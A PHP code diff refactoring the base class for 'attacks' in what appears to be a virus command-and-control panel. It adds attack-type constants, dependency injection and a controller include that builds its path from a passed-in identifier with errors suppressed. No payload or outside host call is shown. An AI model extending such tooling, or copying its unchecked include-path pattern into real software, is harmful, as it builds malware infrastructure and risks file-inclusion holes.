@@ -4,6 +4,7 @@ namespace Kelvinho\Virus\Attack;
 
 use Kelvinho\Virus\Network\RequestData;
 use Kelvinho\Virus\Session\Session;
+use Kelvinho\Virus\Singleton\Logs;
 use Kelvinho\Virus\User\UserFactory;
 use Kelvinho\Virus\Virus\VirusFactory;
 use mysqli;
@@ -24,9 +25,14 @@ use mysqli;
  * @license http://www.opensource.org/licenses/mit-license.html  MIT License
  */
 abstract class AttackBase {
+    public const STATUS_ALL = "All";
     public const STATUS_DORMANT = "Dormant";
     public const STATUS_EXECUTED = "Executed";
     public const STATUS_DEPLOYED = "Deployed";
+    public const TYPE_ALL = 0;
+    public const TYPE_ONE_TIME = 1;
+    public const TYPE_SESSION = 2;
+    public const TYPE_BACKGROUND = 3;
     public const STATUSES = [self::STATUS_DORMANT, self::STATUS_DEPLOYED, self::STATUS_EXECUTED];
     protected string $attack_id;
     protected string $packageDbName; // this is read-only. After an attack is initialized, you can't change its package.
@@ -41,17 +47,19 @@ abstract class AttackBase {
     protected AttackFactory $attackFactory;
     protected UserFactory $userFactory;
     private mysqli $mysqli;
+    protected PackageRegistrar $packageRegistrar;
 
     public function __construct() {
     }
 
-    function setContext(RequestData $requestData, Session $session, UserFactory $userFactory, VirusFactory $virusFactory, AttackFactory $attackFactory, mysqli $mysqli) {
+    function setContext(RequestData $requestData, Session $session, UserFactory $userFactory, VirusFactory $virusFactory, AttackFactory $attackFactory, mysqli $mysqli, PackageRegistrar $packageRegistrar) {
         $this->requestData = $requestData;
         $this->session = $session;
         $this->userFactory = $userFactory;
         $this->virusFactory = $virusFactory;
         $this->attackFactory = $attackFactory;
         $this->mysqli = $mysqli;
+        $this->packageRegistrar = $packageRegistrar;
     }
 
     public function getAttackId(): string {
@@ -72,6 +80,14 @@ abstract class AttackBase {
 
     public function isStatus(string $status): bool {
         return $status == $this->status;
+    }
+
+    public function getType(): int {
+        if (strpos($this->packageDbName, "oneTime") !== false) return self::TYPE_ONE_TIME;
+        if (strpos($this->packageDbName, "session") !== false) return self::TYPE_SESSION;
+        if (strpos($this->packageDbName, "background") !== false) return self::TYPE_BACKGROUND;
+        Logs::unreachableState("\\Kelvinho\\Virus\\Attack\\AttackBase");
+        return -1;
     }
 
     public function getName(): string {
@@ -154,17 +170,22 @@ abstract class AttackBase {
     abstract public function processExtras(string $resourceIdentifier): void;
 
     /**
-     * This will include the correct controller page for this particular attack type.
+     * This will include the correct controller for this particular attack type and then include the "base" controller
+     * with the same name. It is intended to be used this way, because then the specific packages can even decide if
+     * they want to not include the base controller (by ending the connection right away).
+     *
+     * @param string $controllerIdentifier
      */
-    public function includeController(): void {
-        include(PackageRegistrar::getLocation($this->packageDbName) . "/controller.php");
+    public function includeController(string $controllerIdentifier): void {
+        @include($this->packageRegistrar->getLocation($this->packageDbName) . "/controller/$controllerIdentifier.php");
+        @include(__DIR__ . "/common/controller/$controllerIdentifier.php");
     }
 
     /**
      * This will include the correct intercept script
      */
     public function includeIntercept(): void {
-        include(PackageRegistrar::getLocation($this->packageDbName) . "/intercept.php");
+        include($this->packageRegistrar->getLocation($this->packageDbName) . "/intercept.php");
     }
 
     /**
